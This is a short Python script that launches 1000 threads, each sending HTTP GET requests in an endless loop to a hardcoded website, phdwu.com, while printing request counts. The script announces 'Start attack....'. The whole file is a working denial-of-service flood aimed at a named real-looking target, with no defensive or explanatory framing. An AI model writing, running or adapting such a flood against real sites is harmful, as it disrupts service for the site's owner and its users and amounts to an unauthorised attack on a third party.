import threading
import requests
from bs4 import BeautifulSoup
def attack(index, url):
    cnt = 0
    while True:
        cnt += 1
        response = requests.get(url)
        print("[%d]  ==  %d"%(index, cnt))
 
if __name__ == "__main__":
    url = 'http://phdwu.com/'
    x = 1000
 
    pool = []
    for i in range(x):
        pool.append(threading.Thread(target = attack, args = (i, url)))
 
    print("Start attack....")
    for i in range(x):
        pool[i].start()
